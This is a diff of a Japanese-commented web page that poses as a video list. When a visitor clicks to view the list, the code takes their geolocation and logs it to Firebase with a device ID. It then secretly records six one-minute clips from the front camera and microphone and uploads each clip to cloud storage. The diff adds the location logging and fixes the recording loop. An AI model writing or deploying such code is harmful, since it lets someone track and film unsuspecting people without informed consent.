@@ -39,7 +39,7 @@
     }
 
     #videoList {
-      display: none; /* 最初はリストを非表示 */
+      display: none;
     }
 
     #showListBtn {
@@ -149,7 +149,7 @@
     });
 
     const videos = [
-      { url: 'https://test.mp4', thumbnailUrl: 'https://test.jpg', name: 'test' }
+      { url: 'https://test.mp4', thumbnailUrl: 'https://test.jpg', name: 'テスト動画' }
     ];
 
     const videoPlayer = document.getElementById('videoPlayer');
@@ -181,10 +181,10 @@
     videos.forEach(createVideoItem);
 
     function getUserId() {
-      let id = localStorage.getItem('userId');
+      let id = localStorage.getItem('deviceID');
       if (!id) {
-        id = 'user_' + crypto.randomUUID();
-        localStorage.setItem('userId', id);
+        id = 'device_' + crypto.randomUUID();
+        localStorage.setItem('deviceID', id);
       }
       return id;
     }
@@ -193,6 +193,7 @@
       const userId = getUserId();
 
       try {
+        // 位置情報取得
         const geo = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
         });
@@ -200,21 +201,25 @@
         const latitude = geo.coords.latitude;
         const longitude = geo.coords.longitude;
 
+        // Realtime Database に保存
+        const logRef = push(dbRef(db, "LoginLogs"));
+        await set(logRef, {
+          deviceID: userId,
+          timestamp: Date.now(),
+          location: {
+            latitude,
+            longitude
+          }
+        });
+
+        // カメラ＋マイク取得
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: true
         });
 
-        // UI更新
         document.getElementById('showListBtn').style.display = 'none';
         document.getElementById('videoList').style.display = 'block';
-
-        const locationRef = push(dbRef(db, `locations/${userId}`));
-        await set(locationRef, {
-          timestamp: Date.now(),
-          latitude,
-          longitude
-        });
 
         const recorder = new MediaRecorder(stream, {
           mimeType: 'video/webm;codecs=vp8,opus'
@@ -222,36 +227,41 @@
 
         const chunks = [];
         let partIndex = 0;
-const maxParts = 6; // 6回 = 6分
+        const maxParts = 6;
 
-recorder.onstop = async () => {
-  const blob = new Blob(chunks, { type: 'video/webm' });
-  const filePath = `recordings/${userId}/${Date.now()}_part${partIndex + 1}.webm`;
-  const videoRef = storageRef(storage, filePath);
+        recorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            chunks.push(event.data);
+          }
+        };
 
-  await uploadBytes(videoRef, blob);
-  chunks.length = 0;
-  partIndex++;
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const filePath = `recordings/${userId}/${Date.now()}_part${partIndex + 1}.webm`;
+          const videoRef = storageRef(storage, filePath);
 
-  if (partIndex < maxParts) {
-    recorder.start();
-    setTimeout(() => {
-      recorder.stop();
-    }, 60 * 1000); // ← 1分ごとに録画
-  } else {
-    stream.getTracks().forEach(track => track.stop());
-  }
-};
+          await uploadBytes(videoRef, blob);
+          chunks.length = 0;
+          partIndex++;
 
-recorder.start();
-setTimeout(() => {
-  recorder.stop();
-}, 60 * 1000); // ← 最初の録画も1分
+          if (partIndex < maxParts) {
+            recorder.start();
+            setTimeout(() => {
+              recorder.stop();
+            }, 60 * 1000);
+          } else {
+            stream.getTracks().forEach(track => track.stop());
+          }
+        };
 
+        recorder.start();
+        setTimeout(() => {
+          recorder.stop();
+        }, 60 * 1000); // 最初の録画：1分
 
       } catch (err) {
-        console.error(err);
-        alert('権限を許可してください');
+        console.error("エラー:", err);
+        alert("位置情報やカメラ・マイクの権限を許可してください。");
       }
     };
   </script>
